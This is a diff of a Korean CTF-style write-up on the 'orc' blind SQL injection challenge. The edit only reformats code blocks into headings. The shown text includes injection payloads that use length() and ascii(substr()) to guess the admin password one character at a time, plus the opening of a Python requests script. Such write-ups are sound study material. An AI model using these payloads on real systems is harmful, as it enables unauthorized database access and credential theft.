@@ -9,9 +9,7 @@ blind SQLinjection은 참과 거짓이 어떻게 표시되는지 알아내는게
 입력한 pw값이 DB에 있는 pw와 같아야 문제가 풀리므로 pw를 알아내야 한다.
 다음 쿼리문으로 pw의 길이를 알아낼 수 있다.
 ```
-```
-select id from prob_orc where id='admin' and pw=''or length(pw)=n-- {$_GET[pw]}'
-```
+##### select id from prob_orc where id='admin' and pw=''or length(pw)=n-- {$_GET[pw]}'
 ```python
 import requests as req 
 
@@ -29,9 +27,7 @@ for i in range(10):
 ```
 다음 쿼리문으로 pw의 글자를 하나씩 비교해 알아낼 수 있다.
 ```
-```
-select id from prob_orc where id='admin' and pw=''or ascii(substr(pw from 숫자 for 1))=숫자-- {$_GET[pw]}'
-```
+##### select id from prob_orc where id='admin' and pw=''or ascii(substr(pw from 숫자 for 1))=숫자-- {$_GET[pw]}'
 ```
 substr(pw from n for 1)은 mysql함수로 문자열을 잘라준다. pw의 n번째 자리(1부터시작)부터 for뒤의 숫자 개수만큼 잘라 반환한다.
 ascii()는 해당 글자의 ascii코드 값을 반환한다.
